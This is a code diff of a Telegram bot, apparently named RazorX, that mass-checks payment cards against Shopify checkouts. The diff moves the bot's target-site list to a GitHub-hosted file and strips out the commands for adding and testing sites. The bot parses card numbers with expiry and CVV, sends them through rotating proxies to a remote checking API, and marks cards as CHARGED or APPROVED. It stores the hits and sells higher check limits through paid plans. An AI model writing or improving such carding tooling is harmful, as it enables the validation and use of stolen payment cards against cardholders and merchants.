@@ -14,17 +14,10 @@ import json
 import re
 import string
 import logging
-import socket
-import platform
+import io
 from datetime import datetime, timedelta
 from urllib.parse import urlparse, quote
 from typing import Optional, List
-from telethon.errors import (
-    UserNotParticipantError,
-    ChatAdminRequiredError,
-    ChannelPrivateError,
-)
-import io
 
 try:
     import psutil
@@ -32,72 +25,14 @@ try:
 except ImportError:
     PSUTIL_AVAILABLE = False
 
+# تم إزالة استدعاءات قواعد بيانات المواقع لأننا نعتمد على جيت هب الآن
 from database2 import (
     init_db, ensure_user, get_user_plan, set_user_plan,
-    is_premium_user, is_banned_user, get_user_sites,
-    add_site_db, remove_site_db, get_all_user_proxies,
+    is_premium_user, is_banned_user, get_all_user_proxies,
     get_proxy_count, add_proxy_db, remove_proxy_by_index,
     clear_all_proxies, is_user_marked_joined, mark_user_joined,
-    remove_joined_mark, get_total_users, get_premium_count,
-    get_total_sites_count, get_global_sites
+    remove_joined_mark, get_total_users, get_premium_count
 )
-
-# ====================== LOCAL DB HELPERS (SECURED) ======================
-DB_LOCK_MAIN = asyncio.Lock()
-
-async def save_card_to_db(card, status, response, gateway, price):
-    async with DB_LOCK_MAIN:
-        try:
-            if not os.path.exists("database.json"): return
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                data = json.loads(await f.read())
-            if "cards" not in data: data["cards"] = []
-            data["cards"].append({
-                "card": card, "status": status, "response": response,
-                "gateway": gateway, "price": price,
-                "date": datetime.utcnow().isoformat()
-            })
-            async with aiofiles.open("database.json", "w", encoding="utf-8") as f:
-                await f.write(json.dumps(data, indent=4))
-        except Exception as e: print(f"DB Save Error: {e}")
-
-async def get_total_cards_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return len(json.loads(await f.read()).get("cards", []))
-        except: return 0
-
-async def get_charged_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return sum(1 for c in json.loads(await f.read()).get("cards", []) if c.get("status") == "CHARGED")
-        except: return 0
-
-async def get_approved_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return sum(1 for c in json.loads(await f.read()).get("cards", []) if c.get("status") == "APPROVED")
-        except: return 0
-
-# ====================== LOGGING & UTILITIES ======================
-log = logging.getLogger("RazorX")
-log.setLevel(logging.INFO)
-_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
-_ch = logging.StreamHandler()
-_ch.setLevel(logging.INFO)
-_ch.setFormatter(_log_fmt)
-log.addHandler(_ch)
-
-def log_system(action, msg, level="info"):
-    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
-
-# إيقاف دالة الزخرفة لضمان الفخامة الكلاسيكية ووضوح القراءة
-def bs(text):
-    if not text: return text
-    return str(text)
 
 # ====================== CONFIG ======================
 API_ID = int(os.getenv('API_ID', 0))
@@ -120,9 +55,11 @@ JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
 # --- API ENDPOINTS ---
 API_BASE_URL = os.getenv("API_BASE_URL", "https://web-production-e6929.up.railway.app/shopify")
 
+# 👇 ضع رابط ملف الـ sites.txt الخاص بك على جيتهب (يجب أن يكون بصيغة RAW) 👇
+GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/username/repo/main/sites.txt")
+
 SP_PER_USER_WORKERS = 30
 MSP_PER_USER_WORKERS = 70
-SITE_PER_USER_WORKERS = 30
 PROXY_PER_USER_WORKERS = 50
 BIN_WORKERS = 20
 
@@ -151,7 +88,7 @@ CE = {
     "info": 5042306247047513767, "gift": 5041975203853239332, "eyes": 5039623284056917259, 
     "trash": 5039614900280754969, "tick": 5039844895779455925, "stop": 5039671744172917707, 
     "warn": 5039665997506675838, "link": 5042101437237036298, "globe": 5042186567783809934, 
-    "restart": 5413554170668032766, "online": 5413813953685923984, "declined": 4956612582816351459
+    "declined": 4956612582816351459
 }
 PE = "⭐"
 
@@ -166,6 +103,93 @@ ANIME_GIFS = [
     "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif"
 ]
 
+# ====================== LOCAL DB HELPERS ======================
+DB_LOCK_MAIN = asyncio.Lock()
+
+async def save_card_to_db(card, status, response, gateway, price):
+    async with DB_LOCK_MAIN:
+        try:
+            if not os.path.exists("database.json"): return
+            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
+                data = json.loads(await f.read())
+            if "cards" not in data: data["cards"] = []
+            data["cards"].append({
+                "card": card, "status": status, "response": response,
+                "gateway": gateway, "price": price,
+                "date": datetime.utcnow().isoformat()
+            })
+            async with aiofiles.open("database.json", "w", encoding="utf-8") as f:
+                await f.write(json.dumps(data, indent=4))
+        except Exception: pass
+
+async def get_total_cards_count():
+    async with DB_LOCK_MAIN:
+        try:
+            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
+                return len(json.loads(await f.read()).get("cards", []))
+        except: return 0
+
+async def get_charged_count():
+    async with DB_LOCK_MAIN:
+        try:
+            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
+                return sum(1 for c in json.loads(await f.read()).get("cards", []) if c.get("status") == "CHARGED")
+        except: return 0
+
+async def get_approved_count():
+    async with DB_LOCK_MAIN:
+        try:
+            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
+                return sum(1 for c in json.loads(await f.read()).get("cards", []) if c.get("status") == "APPROVED")
+        except: return 0
+
+# ====================== GITHUB SITES FETCHER ======================
+_CACHED_SITES = []
+_LAST_SITES_FETCH = 0
+
+async def get_github_sites():
+    global _CACHED_SITES, _LAST_SITES_FETCH
+    now = time.time()
+    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600):  # تحديث المواقع كل 10 دقائق
+        return _CACHED_SITES
+        
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
+                if r.status == 200:
+                    text = await r.text()
+                    sites = []
+                    for line in text.split('\n'):
+                        site = line.strip()
+                        if site:
+                            site = re.sub(r'^https?://', '', site).rstrip('/')
+                            sites.append(site)
+                    if sites:
+                        _CACHED_SITES = list(set(sites))
+                        _LAST_SITES_FETCH = now
+    except Exception: pass
+    
+    # في حال فشل الاتصال بجيت هب، يقرأ من الملف الاحتياطي لو كان موجوداً
+    if not _CACHED_SITES and os.path.exists('sites.txt'):
+        try:
+            with open('sites.txt', 'r', encoding='utf-8') as f:
+                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
+        except: pass
+        
+    return _CACHED_SITES
+
+# ====================== LOGGING & UTILITIES ======================
+log = logging.getLogger("RazorX")
+log.setLevel(logging.INFO)
+_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+_ch = logging.StreamHandler()
+_ch.setLevel(logging.INFO)
+_ch.setFormatter(_log_fmt)
+log.addHandler(_ch)
+
+def log_system(action, msg, level="info"):
+    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
+
 async def fetch_random_gif():
     try:
         async with aiohttp.ClientSession() as s:
@@ -177,15 +201,9 @@ async def fetch_random_gif():
     except: pass
     return None
 
-ACTIVE_SESSIONS = {}
 ACTIVE_MTXT_PROCESSES = {}
-ACTIVE_ADD_PROCESSES = {}
-PENDING_ADD_SITES = {}
-PENDING_SITE_CHECK = {}
 USER_APPROVED_PREF = {}
 MAINTENANCE_FILE = "maintenance.json"
-_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
-_JOIN_CACHE = {}
 _FREE_SP_USAGE = {}
 _FREE_SP_LAST_USE = {}
 HIT_BUTTON = [[Button.url("Razor X", "https://t.me/Razor_x_1998_bot")]]
@@ -201,7 +219,7 @@ _BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
 def get_user_sem(uid, sem_type="msp"):
     key = f"{uid}_{sem_type}"
     if key not in _USER_SEMS:
-        limits = {"sp": 30, "msp": 70, "site": 30, "proxy": 50}
+        limits = {"sp": 30, "msp": 70, "proxy": 50}
         _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
     return _USER_SEMS[key]
 
@@ -213,7 +231,7 @@ async def get_user_http_session(uid, purpose="general"):
     key = f"{uid}_{purpose}"
     session = _USER_HTTP_SESSIONS.get(key)
     if session is None or session.closed:
-        connector = aiohttp.TCPConnector(limit=150, limit_per_host=50, ttl_dns_cache=300, use_dns_cache=True, keepalive_timeout=30)
+        connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
         session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=connector)
         _USER_HTTP_SESSIONS[key] = session
     return session
@@ -234,7 +252,7 @@ async def get_bin_session():
 async def get_proxy_session():
     global _GLOBAL_PROXY_SESSION
     if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
-        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15), connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
+        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=10), connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
     return _GLOBAL_PROXY_SESSION
 
 def _get_today_key(): return datetime.now().strftime("%Y-%m-%d")
@@ -269,39 +287,6 @@ def extract_cc(text):
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
 
-def normalize_site_url(url):
-    url = url.strip().lower()
-    url = re.sub(r'^https?://', '', url)
-    url = url.rstrip('/')
-    if url.startswith('www.'): url = url[4:]
-    if '/' in url: url = url.split('/')[0]
-    return url
-
-def is_valid_url_or_domain(url):
-    d = url.lower()
-    if d.startswith(('http://', 'https://')):
-        try: d = urlparse(url).netloc
-        except: return False
-    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))
-
-def extract_urls_from_text(text):
-    seen, result = set(), []
-    for line in text.split('\n'):
-        line = line.strip()
-        if not line: continue
-        m = re.match(r'(https?://[^\s{(]+)', line)
-        if m:
-            norm = normalize_site_url(m.group(1).rstrip('/'))
-            if norm and is_valid_url_or_domain(norm) and norm not in seen:
-                seen.add(norm); result.append(norm)
-            continue
-        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
-        if cleaned:
-            norm = normalize_site_url(cleaned)
-            if norm and is_valid_url_or_domain(norm) and norm not in seen:
-                seen.add(norm); result.append(norm)
-    return result
-
 def parse_proxy_format(proxy):
     proxy = proxy.strip()
     pt = 'http'
@@ -326,21 +311,12 @@ def parse_proxy_format(proxy):
     pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
     return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
 
-# ====================== TXT FILE LOADERS ======================
-SITES_FILE = 'sites.txt'
-PROXY_FILE = 'proxy.txt'
-
 def get_file_lines(filepath):
     if not os.path.exists(filepath): return []
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             return [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        print(f"Error reading {filepath}: {e}")
-        return []
-
-def get_txt_sites():
-    return [normalize_site_url(s) for s in get_file_lines(SITES_FILE) if s]
+    except Exception: return []
 
 def get_txt_proxies():
     proxies = []
@@ -349,7 +325,7 @@ def get_txt_proxies():
         if p: proxies.append(p)
     return proxies
 
-# ====================== ROTATOR & DETECTION ======================
+# ====================== ROTATOR ======================
 class SmartRotator:
     def __init__(self): self._site_fails = {}; self._proxy_fails = {}; self._site_idx = 0; self._proxy_idx = 0
     def pick_site(self, sites, exclude=None):
@@ -377,17 +353,6 @@ class SmartRotator:
     def report_proxy_fail(self, proxy_url):
         if proxy_url: self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1
 
-SITE_ERROR_KEYWORDS = ['r4 token empty', 'not shopify', 'payment method is not shopify', 'site error', 'hcaptcha detected', 'cloudflare']
-PROXY_ERROR_KEYWORDS = ['proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed', 'proxy refused', 'timeout', 'timed out']
-
-def is_site_error(text):
-    if not text: return True
-    return any(kw in text.lower().strip() for kw in SITE_ERROR_KEYWORDS)
-
-def is_proxy_error(text):
-    if not text: return False
-    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)
-
 # ====================== API CHECKERS ======================
 async def test_proxy(proxy_url):
     try:
@@ -413,7 +378,9 @@ def classify_response(rj):
     if price and price != '-': price = f"${price}"
     rl = ar.lower()
     
-    if is_site_error(ar) or is_proxy_error(ar) or not ar: return {"Response": ar or "Connection Timeout", "Price": price, "Gateway": gw, "Status": "SiteError"}
+    # حماية من الأخطاء العشوائية أو البروكسيات الميتة
+    if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']) or not ar: 
+        return {"Response": ar or "Connection Timeout", "Price": price, "Gateway": gw, "Status": "SiteError"}
     
     ch = ['order_paid', 'payment successful', 'charged']
     ap = ['otp_required', '3d_authentication', '3ds_required', 'insufficient_funds', 'cvc', 'ccn live cvv', 'insufficient funds']
@@ -434,15 +401,18 @@ async def check_card_api(card, site, proxy_data=None, user_id=None, http_session
             ps = f"{proxy_data.get('username','')}:{proxy_data.get('password','')}@{proxy_data['ip']}:{proxy_data['port']}" if proxy_data.get('username') else f"{proxy_data['ip']}:{proxy_data['port']}"
             url += f'&proxy={quote(ps, safe="")}'
         s = http_session or (await get_user_http_session(uid, "sp"))
+        
         async with s.get(url) as r:
-            if r.status != 200: return {"Response": f"HTTP Error {r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
-            try: rj = await r.json(content_type=None)
-            except: return {"Response": "Invalid JSON response", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
-        result = classify_response(rj); result["card"] = card; result["site"] = site
+            text_data = await r.text()
+            if r.status != 200: return {"Response": f"HTTP Error {r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card}
+            try: rj = json.loads(text_data)
+            except: return {"Response": "Invalid API response", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card}
+            
+        result = classify_response(rj); result["card"] = card
         return result
-    except Exception as e: return {"Response": "Connection Timeout/Proxy Error", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
+    except Exception as e: return {"Response": "Timeout/Proxy Failed", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card}
 
-async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=6, rotator=None, cancel_check=None, http_session=None):
+async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=5, rotator=None, cancel_check=None, http_session=None):
     if not sites: return {"Response": "No sites configured", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
     tried_sites = set(); tried_proxies = set(); last = None
     
@@ -476,18 +446,6 @@ async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, ma
         
     return {"Response": "Max retries reached", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
 
-async def test_site(site, proxy_data=None, http_session=None):
-    try:
-        url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc=5154623245618097|03|2032|156'
-        s = http_session or (await get_user_http_session(0, "site"))
-        async with s.get(url) as resp:
-            if resp.status != 200: return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
-            raw = await resp.json(content_type=None)
-        rm = raw.get('Response', ''); price = raw.get('Price', '-')
-        if is_site_error(rm.lower()): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
-        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
-    except Exception as e: return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}
-
 # ====================== UI / MESSAGES ======================
 def build_entities(html_text, emoji_ids=None):
     try:
@@ -506,8 +464,8 @@ async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None
     try:
         text, entities = build_entities(html_text, emoji_ids)
         return await asyncio.wait_for(event.reply(text, formatting_entities=entities, buttons=buttons, file=file if file else None, link_preview=False), timeout=15)
-    except Exception as e:
-        try: return await event.reply(html_text[:4000], parse_mode='html', buttons=buttons, link_preview=False)
+    except Exception:
+        try: return await event.reply(html_text[:4000], parse_mode='html', buttons=buttons, file=file, link_preview=False)
         except: return None
 
 async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
@@ -515,7 +473,7 @@ async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=Non
         text, entities = build_entities(html_text, emoji_ids)
         return await asyncio.wait_for(client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file if file else None, link_preview=False), timeout=15)
     except: 
-        try: return await client_instance.send_message(chat_id, html_text[:4000], parse_mode='html', buttons=buttons, link_preview=False)
+        try: return await client_instance.send_message(chat_id, html_text[:4000], parse_mode='html', buttons=buttons, file=file, link_preview=False)
         except: return None
 
 async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
@@ -529,8 +487,8 @@ def pbtn(text, data=None, url=None):
     if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
     return Button.inline(text, b"none")
 
-# --- تنسيق كلاسيكي فخم وقوي خالي من وسم الاقتباس المسبب للأخطاء ---
-def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
+# --- تصميم نظيف وفخم للردود باستخدام الـ blockquote مدعوم رسمياً ---
+def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
     ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
     
@@ -549,31 +507,15 @@ def format_card_result(status, card, gateway, response, price="-", site="-", bin
 
     return f"""{header}
 ━━━━━━━━━━━━━━━━━
-💳 <b>Card:</b> <code>{card}</code>
+<blockquote>💳 <b>Card:</b> <code>{card}</code>
 💬 <b>Response:</b> <code>{response}</code>
 🌐 <b>Gateway:</b> <code>{gateway}</code>
-💲 <b>Price:</b> <code>{ps}</code>
+💲 <b>Price:</b> <code>{ps}</code></blockquote>
 ━━━━━━━━━━━━━━━━━
 🏦 <b>Bank:</b> <code>{bi.get('bank', '-')}</code>
 🌍 <b>Country:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
 🏢 <b>Type:</b> <code>{bi.get('brand', '-')} - {bi.get('type', '-')} - {bi.get('level', '-')}</code>
 ⏱ <b>Took:</b> <code>{elapsed:.2f}s</code>""", emoji_id
-
-def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
-    return format_card_result(status, card, gateway, response, extra_field[1] if extra_field else "-", "-", bin_info, elapsed)
-
-# دالة إرسال للقناة بأمان تام (تشمل Charged و Approved)
-async def send_channel_hit(result, uid, username, name, gateway, status="Charged"):
-    if not HIT_CHANNEL_ID: return
-    try:
-        card = result.get("card", "")
-        resp = result.get("Response", "")
-        price = result.get("Price", "-")
-        bi = await get_bin_info(card.split("|")[0])
-        msg, eid = format_card_result(status, card, gateway, resp, price, "-", bi, 0.0)
-        msg += f"\n\n👤 <b>User:</b> <a href='tg://user?id={uid}'>{name}</a> (<code>{username}</code>)"
-        await styled_send(HIT_CHANNEL_ID, msg, emoji_ids=eid, buttons=HIT_BUTTON)
-    except: pass
 
 # ====================== MIDDLEWARES ======================
 async def is_user_joined(user_id):
@@ -637,16 +579,6 @@ async def _check_free_limits(event, uid, plan, is_group):
             return False
     return True
 
-def _get_card_from_event(event, reply_msg):
-    card = None
-    if reply_msg and reply_msg.text:
-        cc = extract_cc(reply_msg.text)
-        if cc: card = cc[0]
-    if not card:
-        cc = extract_cc(event.message.text)
-        if cc: card = cc[0]
-    return card
-
 # ====================== COMMANDS (USER) ======================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
 async def start(event):
@@ -675,12 +607,6 @@ async def start(event):
         text = f"""{PE} <b><i>Shopify Checker</i></b>
 |   {PE} <code>/sp</code> ━ <b>Single CC</b>
 |   {PE} <code>/msp</code> ━ <b>Mass CC</b>
-
-{PE} <b><i>Sites Management</i></b>
-|   {PE} <code>/add</code> ━ <b>Add sites</b>
-|   {PE} <code>/rm</code> ━ <b>Remove</b>
-|   {PE} <code>/sites</code> ━ <b>View</b>
-|   {PE} <code>/site</code> ━ <b>Test all</b>
 
 {PE} <b><i>Proxy Config</i></b> (Private)
 |   {PE} <code>/addpxy</code> ━ <b>Add</b>
@@ -736,7 +662,6 @@ async def info_cmd(event):
         if not await force_join_check(event): return
         await ensure_user(event.sender_id)
         plan = await get_user_plan(event.sender_id)
-        sites = await get_user_sites(event.sender_id)
         pc = await get_proxy_count(event.sender_id)
         plan_emoji = "🆓"
         for pi in PLANS.values():
@@ -757,209 +682,10 @@ async def info_cmd(event):
         limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/day (group)</code>"
         used_today = get_free_sp_usage(event.sender_id)
         usage_line = f"\n{PE} <b>Used Today:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>" if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID else ""
-        await styled_reply(event, f"""{PE} <b>Profile</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>ID:</b> <code>{event.sender_id}</code>\n{PE} <b>Status:</b> <code>{status}</code>\n{PE} <b>Plan:</b> {plan_emoji} <b>{plan.upper()}</b>\n{PE} <b>Expiry:</b> <code>{exp_str}</code>\n{PE} <b>Limit:</b> {limit_text}{usage_line}\n{PE} <b>Sites:</b> <code>{len(sites)}</code>\n{PE} <b>Proxies:</b> <code>{pc}/100</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["globe"], CE["link"], CE["shield"]])
+        
+        # الإحصائيات بعد إلغاء المواقع من الداتا بيز
+        await styled_reply(event, f"""{PE} <b>Profile</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>ID:</b> <code>{event.sender_id}</code>\n{PE} <b>Status:</b> <code>{status}</code>\n{PE} <b>Plan:</b> {plan_emoji} <b>{plan.upper()}</b>\n{PE} <b>Expiry:</b> <code>{exp_str}</code>\n{PE} <b>Limit:</b> {limit_text}{usage_line}\n{PE} <b>Proxies:</b> <code>{pc}/100</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["shield"]])
     except Exception as e: await event.reply(f"⚠️ Error in /info: {e}")
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
-async def add_site(event):
-    try:
-        if not await force_join_check(event): return
-        plan = await get_user_plan(event.sender_id)
-        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
-        sta = []
-        if event.is_reply:
-            rm = await event.get_reply_message()
-            if rm and rm.file:
-                fp = await rm.download_media()
-                if fp:
-                    try:
-                        async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f: sta = extract_urls_from_text(await f.read())
-                        os.remove(fp)
-                    except: pass
-            elif rm and rm.text: sta = extract_urls_from_text(rm.text)
-        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
-        if add_text:
-            for s in extract_urls_from_text(add_text):
-                if s not in sta: sta.append(s)
-        if not sta: return await styled_reply(event, f"""{PE} <b>Add Site</b> {PE}\n{PE} <code>/add site.com</code>\n{PE} <i>Or reply .txt with </i><code>/add</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
-        existing_norm = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}
-        new_sites, already_exists = [], []
-        for site in sta:
-            n = normalize_site_url(site)
-            if n in existing_norm: already_exists.append(n)
-            elif n not in [normalize_site_url(s) for s in new_sites]: new_sites.append(n)
-        if not new_sites: return await styled_reply(event, f"""{PE} <b>All sites already exist</b> {PE}\n{PE} <b>Duplicates:</b> <code>{len(already_exists)}</code>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
-        uid = event.sender_id
-        PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": already_exists, "event": event}
-        kb = [[pbtn("0-5 USD", f"addprice:5:{uid}"), pbtn("0-10 USD", f"addprice:10:{uid}")], [pbtn("0-20 USD", f"addprice:20:{uid}"), pbtn("0-40 USD", f"addprice:40:{uid}")]]
-        await styled_reply(event, f"""{PE} <b>Select Price Range</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>New Sites:</b> <code>{len(new_sites)}</code>\n{PE} <b>Already Exist:</b> <code>{len(already_exists)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <i>Only working sites within price range will be added</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
-    except Exception as e: await event.reply(f"⚠️ Error in /add: {e}")
-
-@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
-async def add_price_cb(event):
-    max_price = int(event.pattern_match.group(1).decode())
-    uid = int(event.pattern_match.group(2).decode())
-    if event.sender_id != uid: return await event.answer(f"Not yours!", alert=True)
-    data = PENDING_ADD_SITES.pop(uid, None)
-    if not data: return await event.answer(f"Expired!", alert=True)
-    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"Already running!", alert=True)
-    ACTIVE_ADD_PROCESSES[uid] = True
-    await event.answer(f"Testing sites...")
-    try: await event.delete()
-    except: pass
-    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))
-
-async def _process_add_sites(event, new_sites, already_exists, max_price):
-    uid = event.sender_id
-    total = len(new_sites); tested = working = dead = added_to_db = 0
-    proxies = await get_all_user_proxies(uid)
-    user_site_sem = get_user_sem(uid, "site")
-    http_session = await get_user_http_session(uid, "site")
-    sm = await styled_reply(event, f"{PE} <b>Testing {total} sites...</b>", emoji_ids=[CE["fire"]])
-    last_ui = [0]
-    def is_stopped(): return uid not in ACTIVE_ADD_PROCESSES
-    async def update_ui():
-        now = time.time()
-        if now - last_ui[0] < 3.0: return
-        last_ui[0] = now
-        try: await styled_edit(sm, f"{PE} <b>Testing...</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
-        except: pass
-    async def test_worker(site):
-        nonlocal tested, working, dead, added_to_db
-        async with user_site_sem:
-            if is_stopped(): return
-            try:
-                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
-                tested += 1
-                if res['status'] == 'alive':
-                    working += 1
-                    price_val = 0
-                    ps = res.get('price', '-')
-                    if ps and ps != '-':
-                        try: price_val = float(str(ps).replace('$', '').strip())
-                        except: pass
-                    if price_val <= max_price:
-                        if await add_site_db(uid, site): added_to_db += 1
-                else: dead += 1
-                await update_ui()
-            except: dead += 1; tested += 1
-    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
-        if is_stopped(): break
-        await asyncio.gather(*[asyncio.create_task(test_worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
-    try: await styled_edit(sm, f"""{PE} <b>Complete</b> {PE}\n{PE} <b>Working:</b> <code>{working}</code> | <b>Dead:</b> <code>{dead}</code> | <b>Added ($0-${max_price}):</b> <code>{added_to_db}</code>""", emoji_ids=[CE["fire"], CE["check"], CE["cross"], CE["chart"]])
-    except: pass
-    ACTIVE_ADD_PROCESSES.pop(uid, None)
-    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
-async def remove_site(event):
-    try:
-        if not await force_join_check(event): return
-        plan = await get_user_plan(event.sender_id)
-        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
-        rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
-        if rt.lower() == 'all':
-            existing = await get_user_sites(event.sender_id)
-            if not existing: return await styled_reply(event, f"{PE} <b>No sites</b>", emoji_ids=[CE["warn"]])
-            c = 0
-            for s in existing:
-                if await remove_site_db(event.sender_id, s): c += 1
-            return await styled_reply(event, f"{PE} <b>Removed {c} sites</b>", emoji_ids=[CE["check"]])
-        if not rt: return await styled_reply(event, f"{PE} <code>/rm site.com</code> or <code>/rm all</code>", emoji_ids=[CE["info"]])
-        to_rm = extract_urls_from_text(rt)
-        if not to_rm: return await styled_reply(event, f"{PE} <b>No URLs</b>", emoji_ids=[CE["cross"]])
-        existing = await get_user_sites(event.sender_id)
-        removed = []
-        for s in to_rm:
-            n = normalize_site_url(s)
-            for ex in existing:
-                if normalize_site_url(ex) == n:
-                    if await remove_site_db(event.sender_id, ex): removed.append(ex)
-                    break
-        await styled_reply(event, f"{PE} <b>Removed:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])
-    except Exception as e: await event.reply(f"⚠️ Error in /rm: {e}")
-
